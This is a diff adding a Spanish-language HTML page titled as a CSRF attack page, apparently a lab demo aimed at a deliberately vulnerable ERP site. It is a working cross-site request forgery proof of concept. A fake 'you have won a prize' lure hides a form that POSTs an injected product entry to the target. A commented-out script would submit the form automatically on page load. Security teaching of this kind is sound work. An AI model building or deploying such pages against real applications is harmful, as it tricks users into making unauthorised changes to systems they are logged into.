@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Página de Ataque CSRF</title>
+</head>
+<body>
+    <h1>¡Has ganado un premio!</h1>
+    <p>Haz clic aquí para reclamarlo...</p>
+    <form action="https://vulnerable.blandskron.com/index.html" method="POST" id="csrfForm">
+        <!-- La URL de acción debe ser la de tu aplicación ERP -->
+        <input type="hidden" name="productName" value="Producto CSRF Inyectado">
+        <input type="hidden" name="productPrice" value="99.99">
+        <input type="hidden" name="productStock" value="1">
+        <input type="submit" value="Reclamar Premio">
+    </form>
+    <script>
+        // Opcional: Envío automático del formulario al cargar la página
+        // document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
